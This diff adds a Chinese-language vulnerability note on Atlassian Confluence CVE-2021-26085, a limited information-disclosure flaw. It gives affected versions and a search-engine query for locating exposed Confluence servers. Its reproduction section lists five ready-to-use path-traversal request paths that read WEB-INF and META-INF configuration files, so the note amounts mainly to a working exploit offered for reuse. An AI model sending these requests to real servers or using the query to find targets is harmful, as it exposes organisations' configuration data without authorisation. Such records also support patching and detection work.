@@ -1,0 +1,35 @@
+# Atlassian Confluence 敏感信息泄露 CVE-2021-26085
+
+## 漏洞描述
+
+Confluence 是一个专业的企业知识管理与协同软件，也可以用于构建企业 wiki。使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。该漏洞不是任意文件读取，只能读取一些 confluence 的配置文件，影响有限。
+
+参考链接：
+
+- https://jira.atlassian.com/browse/CONFSERVER-67893
+
+## 漏洞影响
+
+```
+version < 7.4.10
+7.5.0 ≤ version < 7.12.3
+```
+
+## 网络测绘
+
+```
+app="ATLASSIAN-Confluence"
+```
+
+## 漏洞复现
+
+poc：
+
+```
+/s/123cfx/_/;/WEB-INF/web.xml
+/s/123cfx/_/;/WEB-INF/decorators.xml
+/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml
+/s/123cfx/_/;/META-INF/maven/com.atlassian.confluence/confluence-webapp/pom.properties
+/s/123cfx/_/;/META-INF/maven/com.atlassian.confluence/confluence-webapp/pom.xml
+```
+
